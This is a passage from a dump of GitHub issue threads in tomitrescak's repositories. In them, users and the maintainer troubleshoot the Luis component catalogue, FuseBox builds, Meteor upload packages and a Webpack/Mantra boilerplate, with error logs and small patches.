&#13;
If I use the graphql hoc from react-apollo this error does not occur.</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Yeah, that is not implemented. I use mutations differently using the "mutation" construct from this package. As I have usually 4-5 mutations per component that seemed to be a better option. Once I'll have a bit of time I'll look into this.</Body>
    </Comment>
    <Comment>
      <Owner>geekflyer</Owner>
      <Body>@tomitrescak which mutation construct are you referring to? could you perhaps create an example? thanks</Body>
    </Comment>
  </Issue_729>
  <Issue_730>
    <Repository>corporator</Repository>
    <Title>Server Functionality</Title>
    <Owner>tomitrescak</Owner>
    <Body>- [ ] - Launch a new process instance (wait for @tomitrescak to supply default **data** functionalty)&#13;
- [ ] - Save data to the task&#13;
- [ ] - Comment on process / resource&#13;
- [ ] - Submit Task&#13;
- [ ] - Clone Process - Create a new task with the same data as current task, filtered by the "canClone" - (wait for @tomitrescak to supply the "cloneData" function)&#13;
- [ ] - Pause Process - Changes state and sends email to all stakeholders about process being paused&#13;
- [ ] - Abort process&#13;
- [ ] - Mailing stakeholder on action required / comment / state change (owner)&#13;
- [ ] - Implement "Mail" User Task &#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Please, take these one by one in the Kanbam board and refrence all commits. Thanks.</Body>
    </Comment>
  </Issue_730>
  <Issue_731>
    <Repository>fuse-box-react-test-app</Repository>
    <Title>Instructions don't work</Title>
    <Owner>tomitrescak</Owner>
    <Body>I attempted to try this demo locally by running:&#13;
```bash&#13;
$ yarn install&#13;
$ node fuse luis&#13;
```&#13;
When I navigate to localhost:9001 I get:&#13;
`Cannot GET /`&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Make sure that index.html is in the build directory. Or just try to add WebIndexPlugin.&#13;
&#13;
http://fuse-box.org/plugins/webindexplugin#usage</Body>
    </Comment>
  </Issue_731>
  <Issue_732>
    <Repository>LeapExperience</Repository>
    <Title>Gesture based movement</Title>
    <Owner>tomitrescak</Owner>
    <Body>I was thinking that we can implement some kind of gesture based movement, when using left hand we will control the movement of the player. My idea is that depending how much the thumb is up the faster the player would move. This gesture seems to be detected easily with leap motion so we can get some smooth results.
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Here is a link on how to detect some gestures, not sure how to implement custom gestures though:

http://stackoverflow.com/questions/18292149/leap-motion-gesture-recognition-in-unity3d-always-returns-typeinvalid-and-statei
</Body>
    </Comment>
  </Issue_732>
  <Issue_733>
    <Repository>luis</Repository>
    <Title>How do I use this?</Title>
    <Owner>tomitrescak</Owner>
    <Body>Hi there,&#13;
&#13;
When I follow the steps in the readme, I get:&#13;
&#13;
```&#13;
$ npm run luis&#13;
&#13;
&gt; fuse-box-electron-seed@1.0.5 luis &lt;directory&gt;&#13;
&gt; luis&#13;
&#13;
Custom config not found. Launching standard configuration.&#13;
No root and entry file specified. Estimating 'src' as project root and 'luis.ts' as the entry files.&#13;
If you want to use a different entry file, please run process as 'node luis root path/to/luis.ts&#13;
&lt;directory&gt;/node_modules/luis/luis.fuse.js&#13;
--- FuseBox 3.7.1 ---&#13;
&#13;
--------------------------&#13;
Bundle "luis-vendor" &#13;
&#13;
&#9492;&#9472;&#9472;  (0 files,  53 Bytes) default&#13;
size: 53 Bytes in 36ms&#13;
&#13;
--------------------------&#13;
Bundle "luis-client" &#13;
&#13;
&#9492;&#9472;&#9472;  (0 files,  91 Bytes) default&#13;
&#9492;&#9472;&#9472; events@0.0.0 8 kB (0 files)&#13;
&#9492;&#9472;&#9472; fusebox-hot-reload@0.0.0 7.6 kB (0 files)&#13;
&#9492;&#9472;&#9472; fusebox-websocket@0.0.0 2.9 kB (0 files)&#13;
&#9492;&#9472;&#9472; module@0.0.0 331 Bytes (0 files)&#13;
&#9492;&#9472;&#9472; proxyrequire@1.0.21 4.1 kB (0 files)&#13;
size: 22.9 kB in 27ms&#13;
  &#8594; &#13;
-----------------------------------------------------------------&#13;
Development server running http://localhost:9001 @ 3.7.1&#13;
-----------------------------------------------------------------&#13;
&#13;
19:29:25: HMR is enabled&#13;
19:29:37: Client connected&#13;
&#13;
```&#13;
&#13;
Then when I look at that URL I get a blank page with this in the console:&#13;
```&#13;
default/luis.js does not provide a module&#13;
s @ luis-vendor.js:7&#13;
```&#13;
&#13;
How can I debug this to get Luis running?&#13;
&#13;
---&#13;
&#13;
Alternatively I've tried to get it working with a standalone react component, but get Typescript errors around `setupTestBridge`, and that also fails at runtime:&#13;
&#13;
```&#13;
Uncaught TypeError: luis_1.setupTestBridge is not a function&#13;
    at Object.&lt;anonymous&gt; (renderer.js:52)&#13;
    at c (renderer.js:822)&#13;
    at b.require (renderer.js:822)&#13;
    at Object.&lt;anonymous&gt; (renderer.js:43)&#13;
    at c (renderer.js:822)&#13;
    at b.require (renderer.js:822)&#13;
    at Object.&lt;anonymous&gt; (renderer.js:23)&#13;
    at c (renderer.js:822)&#13;
    at b.require (renderer.js:822)&#13;
    at Object.&lt;anonymous&gt; (renderer.js:11)&#13;
```&#13;
&#13;
How can I get one of these approaches working?</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Hello, thanks for giving this a go. Give me couple days I&#8217;m working on a brand new version with new docs. It&#8217;s going to be spectacular;) a bit of patience and you won&#8217;t regret</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Hi, I prepared a starter project with instructions for using a simple catalogue:&#13;
&#13;
https://github.com/tomitrescak/luis/tree/master/src/examples/catalogue&#13;
&#13;
Please wait couple more days for more instructions on how to connect this to Jest tests and how to incorporate Luis under a custom route.</Body>
    </Comment>
    <Comment>
      <Owner>thekevinbrown</Owner>
      <Body>I tried copying that example including using the RC version of Luis and still get a blank page:&#13;
&#13;
```&#13;
luis-vendor.js:72798 Warning: React.createElement: type is invalid -- expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.&#13;
&#13;
Check the render method of `_class`.&#13;
    in _class (created by inject-_class-with-state)&#13;
    in inject-_class-with-state&#13;
    in Provider&#13;
warningWithoutStack @ luis-vendor.js:72798&#13;
luis-vendor.js:48707 Uncaught Invariant Violation: Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.&#13;
&#13;
Check the render method of `_class`.&#13;
    at invariant (http://localhost:9001/luis-vendor.js:48700:15)&#13;
    at createFiberFromTypeAndProps (http://localhost:9001/luis-vendor.js:58835:11)&#13;
    at createFiberFromElement (http://localhost:9001/luis-vendor.js:58856:15)&#13;
    at reconcileSingleElement (http://localhost:9001/luis-vendor.js:61127:23)&#13;
    at reconcileChildFibers (http://localhost:9001/luis-vendor.js:61184:35)&#13;
    at reconcileChildren (http://localhost:9001/luis-vendor.js:62841:28)&#13;
    at updateHostComponent (http://localhost:9001/luis-vendor.js:63302:3)&#13;
    at beginWork (http://localhost:9001/luis-vendor.js:64088:14)&#13;
    at performUnitOfWork (http://localhost:9001/luis-vendor.js:67751:12)&#13;
    at workLoop (http://localhost:9001/luis-vendor.js:67791:24)&#13;
luis-vendor.js:65556 The above error occurred in the &lt;div&gt; component:&#13;
    in div (created by _class)&#13;
    in div (created by _class)&#13;
    in _class (created by inject-_class-with-state)&#13;
    in inject-_class-with-state&#13;
    in Provider&#13;
&#13;
Consider adding an error boundary to your tree to customize error handling behavior.&#13;
Visit https://fb.me/react-error-boundaries to learn more about error boundaries.&#13;
logCapturedError @ luis-vendor.js:65556&#13;
luis-vendor.js:48700 Uncaught (in promise) Invariant Violation: Element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got: undefined. You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.&#13;
&#13;
Check the render method of `_class`.&#13;
    at invariant (http://localhost:9001/luis-vendor.js:48700:15)&#13;
    at createFiberFromTypeAndProps (http://localhost:9001/luis-vendor.js:58835:11)&#13;
    at createFiberFromElement (http://localhost:9001/luis-vendor.js:58856:15)&#13;
    at reconcileSingleElement (http://localhost:9001/luis-vendor.js:61127:23)&#13;
    at reconcileChildFibers (http://localhost:9001/luis-vendor.js:61184:35)&#13;
    at reconcileChildren (http://localhost:9001/luis-vendor.js:62841:28)&#13;
    at updateHostComponent (http://localhost:9001/luis-vendor.js:63302:3)&#13;
    at beginWork (http://localhost:9001/luis-vendor.js:64088:14)&#13;
    at performUnitOfWork (http://localhost:9001/luis-vendor.js:67751:12)&#13;
    at workLoop (http://localhost:9001/luis-vendor.js:67791:24)&#13;
```&#13;
&#13;
I can't open source what I'm working on, but all I'm looking to do is replace Storybook with Luis to have the component catalogue. I put my stories alongside my components, so in each component folder it looks like this for example:&#13;
&#13;
```&#13;
components/spinner/&#13;
  - index.ts: Exports the pieces of component.tsx that are for public consumption to be able to use the spinner.&#13;
  - component.tsx: The actual spinner component implementation.&#13;
  - stories.tsx: The stories of the spinner.&#13;
```&#13;
&#13;
I suspect the structure you require about needing stories in certain folders is what's causing the issue...? Hard to say without a more concrete error message what's going on from here.</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Kevin, this looks like a fusebox error, not LUIS. Blast the .fusebox folder and run again. I just double checked and following led to successfull view of the luis catalogue:&#13;
&#13;
```&#13;
&#10013;  ~/Downloads $ git clone https://github.com/tomitrescak/luis&#13;
Cloning into 'luis'...&#13;
remote: Enumerating objects: 360, done.&#13;
remote: Counting objects: 100% (360/360), done.&#13;
remote: Compressing objects: 100% (207/207), done.&#13;
remote: Total 1662 (delta 161), reused 309 (delta 141), pack-reused 1302&#13;
Receiving objects: 100% (1662/1662), 1.37 MiB | 282.00 KiB/s, done.&#13;
Resolving deltas: 100% (955/955), done.&#13;
 &#10013;  ~/Downloads $ cd luis/src/examples/catalogue&#13;
 &#10013;  src/examples/catalogue $ yarn&#13;
yarn install v1.13.0&#13;
[1/4] &#128269;  Resolving packages...&#13;
[2/4] &#128666;  Fetching packages...&#13;
[3/4] &#128279;  Linking dependencies...&#13;
[4/4] &#128296;  Building fresh packages...&#13;
&#10024;  Done in 4.53s.&#13;
 &#10013;  src/examples/catalogue $ yarn run luis&#13;
```&#13;
&#13;
&lt;img width="520" alt="image" src="https://user-images.githubusercontent.com/2682705/53227588-5a6e9100-36ca-11e9-94fd-07d3ae68615c.png"&gt;&#13;
&#13;
Please not that the top menu vis coming next week with options for full screen and mobile resolutions and scaling.</Body>
    </Comment>
    <Comment>
      <Owner>thekevinbrown</Owner>
      <Body>I've tried blowing away the `.fusebox` folder and I'm getting another error now. Build is still successful, but I get a blank page with this in the console of the browser.&#13;
&#13;
```&#13;
Uncaught Package not found luis&#13;
u @ luis-vendor.js:7&#13;
c @ luis-vendor.js:7&#13;
b.require @ luis-vendor.js:7&#13;
(anonymous) @ luis.ts:1&#13;
proxyRequire @ luis.ts:7&#13;
(anonymous) @ luis.ts:1&#13;
proxyRequire @ luis.ts:7&#13;
(anonymous) @ luis.ts:1&#13;
c @ luis-vendor.js:7&#13;
r.import @ luis-vendor.js:7&#13;
(anonymous) @ luis.ts:7&#13;
(anonymous) @ luis.ts:7&#13;
```&#13;
&#13;
But I have `luis` installed, listed in the `package.json` file, and it's on disk in `node_modules`...</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>@thekevinbrown if you do the exact steps then me ... still happening? What fusebox is not great in is the nested node-modules folder. Make sure you did not install modules in the main directory, just the child directory.&#13;
&#13;
I will soon post tutorials on how to include this in your app.</Body>
    </Comment>
    <Comment>
      <Owner>thekevinbrown</Owner>
      <Body>If I run it on your project it works, if I run it on mine I get that error.&#13;
&#13;
I'll try to create a reproduction case so you can have something more concrete to go off of.</Body>
    </Comment>
    <Comment>
      <Owner>thekevinbrown</Owner>
      <Body>Here you go: https://github.com/thekevinbrown/luis-reproduction&#13;
&#13;
This is simplified from the [Fusebox Electron Seed](https://github.com/fuse-box/fuse-box-electron-seed) repo, which I added Luis to (I think correctly, but please let me know if not!).&#13;
&#13;
When you run:&#13;
- `npm i`&#13;
- `npm start`&#13;
&#13;
You should see "I work!" in the electron window, which means the main process is working, generating a window, and the "Spinner" component is correctly rendering. This is the component I'm trying to get to show up in the Luis interface.&#13;
&#13;
Kill the process with Ctrl-C, then:&#13;
&#13;
**Expected**&#13;
`npm run luis` presents Luis interface on port 9001&#13;
&#13;
**Actual**&#13;
```&#13;
$ npm run luis&#13;
&#13;
&gt; fuse-box-electron-seed@1.0.5 luis /Users/kevin/development/luis-reproduction&#13;
&gt; luis&#13;
&#13;
Custom config not found. Launching standard configuration.&#13;
/Users/kevin/development/luis-reproduction/node_modules/luis/luis.fuse.js&#13;
--- FuseBox 3.7.1 ---&#13;
  &#8594; Generating recommended tsconfig.json:  /Users/kevin/development/luis-reproduction/src/tsconfig.json&#13;
  &#8594; Typescript script target: ES2018&#13;
&#13;
--------------------------&#13;
Bundle "luis-vendor" &#13;
&#13;
&#9492;&#9472;&#9472;  (0 files,  53 Bytes) default&#13;
&#9492;&#9472;&#9472; @babel/runtime 11.9 kB (25 files)&#13;
&#9492;&#9472;&#9472; @semantic-ui-react/event-stack 22 kB (3 files)&#13;
&#9492;&#9472;&#9472; @tomino/toolbelt 14.2 kB (10 files)&#13;
&#9492;&#9472;&#9472; circular-json-es6 2.5 kB (1 files)&#13;
&#9492;&#9472;&#9472; classnames 1.4 kB (1 files)&#13;
&#9492;&#9472;&#9472; diff-view 26.3 kB (4 files)&#13;
&#9492;&#9472;&#9472; exenv 1 kB (1 files)&#13;
&#9492;&#9472;&#9472; keyboard-key 7.3 kB (1 files)&#13;
&#9492;&#9472;&#9472; lodash 346.2 kB (357 files)&#13;
&#9492;&#9472;&#9472; luis 116 kB (35 files)&#13;
&#9492;&#9472;&#9472; mobx-react 51.6 kB (1 files)&#13;
&#9492;&#9472;&#9472; mobx 171.9 kB (1 files)&#13;
&#9492;&#9472;&#9472; object-assign 2.2 kB (1 files)&#13;
&#9492;&#9472;&#9472; process 3.3 kB (1 files)&#13;
&#9492;&#9472;&#9472; prop-types 28.1 kB (5 files)&#13;
&#9492;&#9472;&#9472; react-dom 867.4 kB (3 files)&#13;
&#9492;&#9472;&#9472; react-is 10.9 kB (3 files)&#13;
&#9492;&#9472;&#9472; react-lifecycles-compat 6.2 kB (1 files)&#13;
&#9492;&#9472;&#9472; react-split-pane 19.9 kB (1 files)&#13;
&#9492;&#9472;&#9472; react-style-proptype 32.3 kB (2 files)&#13;
&#9492;&#9472;&#9472; react 69.4 kB (3 files)&#13;
&#9492;&#9472;&#9472; scheduler 40.6 kB (6 files)&#13;
&#9492;&#9472;&#9472; semantic-ui-react 928.5 kB (251 files)&#13;
&#9492;&#9472;&#9472; shallowequal 1.1 kB (1 files)&#13;
&#9492;&#9472;&#9472; tslib 11.5 kB (1 files)&#13;
size: 2.7 MB in 2s 462ms&#13;
&#13;
--------------------------&#13;
Bundle "luis-client" &#13;
&#13;
    **.stories.js&#13;
    luis.js&#13;
&#9492;&#9472;&#9472;  (2 files,  479 Bytes) default&#13;
&#9492;&#9472;&#9472; events 8 kB (1 files)&#13;
&#9492;&#9472;&#9472; fusebox-hot-reload 7.6 kB (1 files)&#13;
&#9492;&#9472;&#9472; fusebox-websocket 2.9 kB (1 files)&#13;
&#9492;&#9472;&#9472; module 331 Bytes (1 files)&#13;
&#9492;&#9472;&#9472; proxyrequire 4.1 kB (1 files)&#13;
size: 23.3 kB in 133ms&#13;
  &#8594; &#13;
-----------------------------------------------------------------&#13;
Development server running http://localhost:9001 @ 3.7.1&#13;
-----------------------------------------------------------------&#13;
&#13;
11:39:57: HMR is enabled&#13;
```&#13;
&#13;
Accessing the interface on localhost:9001 in Chrome results in:&#13;
```&#13;
Uncaught (in promise) TypeError: Cannot read property '1' of null&#13;
    at luis-vendor.js:17593&#13;
    at Object.setupRouter (luis-vendor.js:17616)&#13;
    at Object.renderLuis (luis-vendor.js:15354)&#13;
    at Object.&lt;anonymous&gt; (luis.ts:3)&#13;
    at c (luis-vendor.js:78111)&#13;
    at Function.r.import (luis-vendor.js:78111)&#13;
    at proxyrequire@1.0.21:127&#13;
    at proxyrequire@1.0.21:127&#13;
```&#13;
&#13;
If I then do `rm -rf .fusebox` followed by `npm run luis` I get this (still in Chrome):&#13;
&#13;
```&#13;
luis-vendor.js:7 Uncaught Package not found luis&#13;
u @ luis-vendor.js:7&#13;
c @ luis-vendor.js:7&#13;
b.require @ luis-vendor.js:7&#13;
(anonymous) @ luis.ts:1&#13;
proxyRequire @ proxyrequire@1.0.21:79&#13;
(anonymous) @ luis.ts:1&#13;
c @ luis-vendor.js:7&#13;
r.import @ luis-vendor.js:7&#13;
(anonymous) @ proxyrequire@1.0.21:127&#13;
(anonymous) @ proxyrequire@1.0.21:127&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Hi, there were several things.&#13;
&#13;
1. In your tsconfig you specified `baseUrl: '.'` This will not work well if your file "luis.ts" is trying to import "luis" as a package. Pretty much it will try to import itself. If you want to use baseUrl, you need to rename the `luis.ts` to something else e.g. `luis_app.ts` and then run `yarn luis --root src --run luis_app.ts` **NOTE** It looks like there is a bug in Luis or FuseBox when you specify baseUrl. I could not make it run with baseUr specified, nor I could make it run with a custom file. I will investigate further.&#13;
&#13;
2. You named your files stories.ts. Currently I support `test, story and fixture` terminology. I can add fixtures as well. This is the experssion in standard LUIS  that loads all stories `' !&gt; [luis.ts] + proxyrequire + **/*.fixture.* + **/*.story.* + **/*.test.* + **/__fixtures__/* + **/__stories__/* + **/__tests__/* + **/tests/*`&#13;
&#13;
See my result:&#13;
&#13;
&lt;img width="846" alt="image" src="https://user-images.githubusercontent.com/2682705/53606457-00f8eb80-3c0f-11e9-8465-1d9ea4388647.png"&gt;</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Long story short. Remove `baseUrl: '.'` from tsconfig.json and rename your file to xxx.story.ts and everything will work. &#13;
&#13;
I will let you know soon about my investigation of why custom files and baseUrl do not work.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Hi, so I made a little tweak to config to make sure `baseUrl` will work in tsconfig. &#13;
&#13;
1. You still have to make sure that you name your stories as `.story, .test or .fixture` as per documentation. If you want it to be different, just add your own config or convince me to support `stories`. See above what everything is automatically added or check out the [luis.fuse.js](https://github.com/tomitrescak/luis/blob/master/luis.fuse.js) config file.&#13;
&#13;
2. You cannot use `baseUrl: '.'` and then import package from the file named the same way. As a result you need to rename the luis.ts to something else, e.g. "luis_app.ts" and then run lusi as `yarn luis --run luis_app.ts`&#13;
&#13;
Check out my fork at https://github.com/tomitrescak/luis-reproduction to see the changes I made in the last commit to make it work.</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>I noted that `baseUrl: '.'` was not actually added by you but automatically generated by typescript as you have not included `tsconfig.json`. So if you do not need this setting then all you really need to do is just to rename your files to adhere to requirements.</Body>
    </Comment>
  </Issue_733>
  <Issue_734>
    <Repository>luis</Repository>
    <Title>[Hotfix]Misc: Add missing dependency 'proxyrequire', fix misspelling.</Title>
    <Owner>tomitrescak</Owner>
    <Body>Very happy to see luis upgrade fuse-box to version 3.&#13;
&#13;
The error below occurs when run npm scripts.&#13;
&#13;
```&#13;
&#177; yarn luis&#13;
yarn run v1.5.1&#13;
$ node fuse.js luis&#13;
module.js:549&#13;
    throw err;&#13;
    ^&#13;
&#13;
Error: Cannot find module 'proxyrequire'&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>LucasIcarus</Owner>
      <Body>BTW,&#13;
&#13;
with `yarn luis` running,&#13;
&#13;
```&#13;
MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 bundle-collected listeners added. Use emitter.setMaxListeners() to increase limit&#13;
```&#13;
this error emit and localhost:9001 couldn't ping.. </Body>
    </Comment>
  </Issue_734>
  <Issue_735>
    <Repository>luis</Repository>
    <Title>Confusion about correct repo and documented features</Title>
    <Owner>tomitrescak</Owner>
    <Body>Hi,&#13;
&#13;
I'm trying to incorporate luis into a project, but I'm confused on a number of topics:&#13;
- Which repo is for the actual luis library? The npm package points to a `louis` repo that doesn't seem to exist, and has a higher version than any repo I can find.&#13;
- Both repos seem to duplicate a lot of functionality.&#13;
- The `luis-app` and `luis` repos have the same documentation, but while `luis-app` seems to be a demo of luis's capabilities rather than designed as the library itself, `luis` (and the npm package) seems to be missing many of the documented features. For example, `StoriesOf` is part of `luis-app` but not `luis`, again suggesting that `luis` is the library, so I'm not sure how to access that functionality.</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Hi, yeah, it's a work in progress. I need to remove the luis-app as it is no longer valid. I also no longer support the Storybook and focus on pure BDD.&#13;
&#13;
I will soon write a new blog post with a new example. &#13;
&#13;
Please stay tuned. </Body>
    </Comment>
  </Issue_735>
  <Issue_736>
    <Repository>Meteor-Boilerplate-Webpack-Mantra-Typescript</Repository>
    <Title>Example app doesn't work: "Component not found"</Title>
    <Owner>tomitrescak</Owner>
    <Body>I try to run the example, but it doesn't start. The error is: 

```
Uncaught TypeError: Cannot read property 'Component' of undefined
```

Any ideas? It seems that React is imported. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Yes, I just bumped into that.
There is some issue with React itself and I reported it to @eXon 

For now, please do

`import { Component } from "react"` instead of `import React from "react"`

I will update the project as soon as possible.
</Body>
    </Comment>
    <Comment>
      <Owner>swennemans</Owner>
      <Body>I've ported my existing Mantra project to Webpack, and made some changes. And everything works as expected. From what I can see the only thing I do differently is importing `React` from NPM, defined in `webpack.packages.json`

Hope it helps.  
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Can you maybe do a PR, or you did not use boilerplate at all?
</Body>
    </Comment>
    <Comment>
      <Owner>swennemans</Owner>
      <Body>Sorry I didn't use the boilerplate at all. 
</Body>
    </Comment>
  </Issue_736>
  <Issue_737>
    <Repository>Meteor-Boilerplate-Webpack-Mantra-Typescript</Repository>
    <Title>Pros and cons of using webpack with Meteor / mantra</Title>
    <Owner>tomitrescak</Owner>
    <Body>This is a follow up to the original issue on https://github.com/kadirahq/mantra/issues/34

arunoda doesn't seem that webpack has anything to do with mantra right now since we have meteor's build system. @tomitrescak could you explain a little bit of where you see this project fit in, and why one may or may not desire to use webpack with Meteor and Mantra?
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Tony, just check out the project page of the Webpack Kickstarter project. You get all the perks of using Webpack and react such as hot code reload and native module support. There is much more. From my part I really like the hot code reload and the module support which is still not ideal in Meteor 1.3. Also I enjoy the development in Typescript and using different loaders and Babel plugins such as the one for jsx controls (if\for)
</Body>
    </Comment>
    <Comment>
      <Owner>tonyxiao</Owner>
      <Body>This is cool. Are there any downsides to this vs. using the mantra at kadirahq/mantra? Just read https://github.com/thereactivestack/meteor-webpack is not compatible with `ecmascript` package since webpack takes care of it. 
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Well, the idea is to use native npm packages and es2105 via Babel and as a result you do not depend on meteor packages, which .... repackage native Libs and often become outdated.

Honestly, I stopped using native meteor and develop everything on Webpack now. It's too good. Also, if you use mantra essentially you will become more agnostic to all used frameworks and able to substitute in the future. All my 10+ projects run on Webpack ... And am slowly switching to mantra.
</Body>
    </Comment>
    <Comment>
      <Owner>tonyxiao</Owner>
      <Body>Got it. does this work with meteor 1.3?
</Body>
    </Comment>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Not yet ... but @exon promised some major improvements when 1.3 will come ;) 1.3 is not needed for now.
</Body>
    </Comment>
    <Comment>
      <Owner>vonwao</Owner>
      <Body>this is interesting.  There is one advantage I see in meteor, is being able to have some "global" variables, not having to import in every single file (I think this is what the "imports" directory in 1.3 is for).  I wonder with webpack if that's possible...
</Body>
    </Comment>
    <Comment>
      <Owner>eXon</Owner>
      <Body>@vonwao Yes you can do the same thing by using the global variable.

``` javascript
global.MyGlobalVariable = `I'm everywhere!`;
```
</Body>
    </Comment>
  </Issue_737>
  <Issue_738>
    <Repository>meteor-tomi-upload-server</Repository>
    <Title>pass req to the getFileName and getDirectory</Title>
    <Owner>tomitrescak</Owner>
    <Body>It is very small patch: 

```
-  getDirectory: function (fileInfo, formData) {
+  getDirectory: function (req, fileInfo, formData) {
-  getFileName: function (fileInfo, formData) {
+  getFileName: function (req, fileInfo, formData) {
```

This parameter let me handle `re.query` inside `getDirectory`, where i can pass the HTTP GET parameter to manipulate of subdirectory path from the client.
</Body>
    <State>open</State>
    <Comment>
      <Owner>titovanton</Owner>
      <Body>Ok, I found the bug...
First of all, I want to say thank you for ur upload-server. It works. But u do not follow conventions :/ , so ur code is very hard to read(especially for noobs like me).
Also, always use `path.join` instead concatination(that's about ur bug):

```
-    var destinationFile = currentFolder + newFileName;
+    var destinationFile = path.join(currentFolder, newFileName);
```
</Body>
    </Comment>
    <Comment>
      <Owner>titovanton</Owner>
      <Body>so, the result of ur concatination is:

```
/path/tofilename
```

instead:

```
/path/to/filename
```

there r alot of concatinations in ur code more, but it seems it works :) It would be awesome to refactor ur code and cover with tests...
</Body>
    </Comment>
  </Issue_738>
  <Issue_739>
    <Repository>meteor-tomi-upload-server</Repository>
    <Title>Allow setting the format in the scaling options</Title>
    <Owner>tomitrescak</Owner>
    <Body>This implements https://github.com/tomitrescak/meteor-uploads/issues/85 and allows you to make sure that thumbnails always have the desired file format (typically jpeg), independently of the original file format.
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>Thanks for the PR! I have a question. What does following line do? Why is there '[0]'
-          srcPath: currentFolder + '/' + newFileName + '[0]',
</Body>
    </Comment>
    <Comment>
      <Owner>hamoid</Owner>
      <Body>I should have left a comment in the code. What it does is selecting the first frame when you upload an animated gif. If you don't do that, you end up having one image per frame on the server (potentially tens or hundreds of images). When you upload a non animated image format, it has no effect. Basically it's a "protection against animated gifs" :)
</Body>
    </Comment>
    <Comment>
      <Owner>hamoid</Owner>
      <Body>You can easily try what happens without it. Remove the '[0]', upload an animated gif, and check out the .upload directory.
</Body>
    </Comment>
  </Issue_739>
  <Issue_740>
    <Repository>meteor-tomi-upload-server</Repository>
    <Title>initUrls honors getDirectory signature providing hash "file" instead of ...</Title>
    <Owner>tomitrescak</Owner>
    <Body>Tomi,

Great package thanks. I just came across this scenario where I build a custom directory path. Down the road, the URL the package computes internally wasn't correct since the parameter used to execute getDirectory wasn't the full object file, but only the file name.

Let me know how I can help further.

Kind regards,
Alex
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomitrescak</Owner>
      <Body>This is a massive breaking change. Hmm, I am thinking of just passing that as a third parameter.
</Body>
    </Comment>
  </Issue_740>
  <Issue_741>
    <Repository>meteor-uploads</Repository>
    <Title>userId when uploading files</Title>
    <Owner>tomitrescak</Owner>
    <Body>Is there a way to pass Meteor.userId() when the image is uploaded? I've been trying to figure that one out for a while now.</Body>
    <State>open</State>
    <Comment>
      <Owner>riley2200</Owner>
      <Body>You use the formdata as described to to add meta data to the images</Body>
    </Comment>
  </Issue_741>
  <Issue_742>
    <Repository>meteor-uploads</Repository>
    <Title>sys is deprecated, Buffer.wirte is deprecated warning.</Title>
    <Owner>tomitrescak</Owner>
    <Body>```
W20160816-20:23:05.855(7)? (STDERR) (node) Buffer.write(string, encoding, offset, length) is deprecated. Use write(string[, offset[, length]][, encoding]) instead.
W20160816-20:24:18.090(7)? (STDERR) (node) sys is deprecated. Use util instead.
```

this may need some update.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cacbon</Owner>
      <Body>Now it is an error, not just a warning message. &#13;
![1](https://cloud.githubusercontent.com/assets/5927810/21977387/882b3fea-dc08-11e6-8f2d-66e0af4fe00a.png)&#13;
![2](https://cloud.githubusercontent.com/assets/5927810/21977391/8d905a56-dc08-11e6-9da9-bce427a5c845.png)&#13;
&#13;
Pls take a look and update.&#13;
</Body>
    </Comment>
  </Issue_742>
  <Issue_743>
    <Repository>meteor-uploads</Repository>
    <Title>Packaged fails to be successfully added to meteor app</Title>
    <Owner>tomitrescak</Owner>
    <Body>I have a telescope based app that uses blaze and a bunch of other packages. I was going to use this package to upload files into a .uploads/tmp file by the client and I cant get it to work after adding it to the app.

The jquery.fileupload.js file and a couple other files are causing an error:
ReferenceError: window is not defined.

Since the jquery.fileupload.js is in the lib folder I understand that it is available in the server and the client, and there is no window in the server so that error makes sense, but why does the package work fine in the sample app, and not in my app? I would love some help getting pointed in the right direction. Thanks so much!
</Body>
    <State>open</State>
    <Comment>
      <Owner>lowi</Owner>
      <Body>With Meteor 1.2.1, I had to use those versions (instead of the latest one) (in .meteor/versions):
tomi:upload-jquery@2.2.2
tomi:upload-server@1.3.3
</Body>
    </Comment>
  </Issue_743>
  <Issue_744>
    <Repository>meteor-uploads</Repository>
    <Title>problem with mupx deploy</Title>
    <Owner>tomitrescak</Owner>
    <Body>Hi,

I'm using 'mupx' to deploy my current app to another server.

the problem is that the file is being uploaded inside a docker, and when I deploy another version of the app, 'mupx' creates another docker, so it doesn't see the previous one, where I stored the files.

i don't know if the issue is for 'meteor-uploads' or for 'mupx'
</Body>
    <State>open</State>
    <Comment>
      <Owner>msj121</Owner>
      <Body>Why did https://github.com/tomitrescak/meteor-uploads/issues/235 not work for you?

You can now setup docker by mounting a directory outside of the docker to store files. That way each docker won't replace the files.

If this has been fixed, please close issue.
</Body>
    </Comment>
  </Issue_744>
  <Issue_745>
    <Repository>meteor-uploads</Repository>
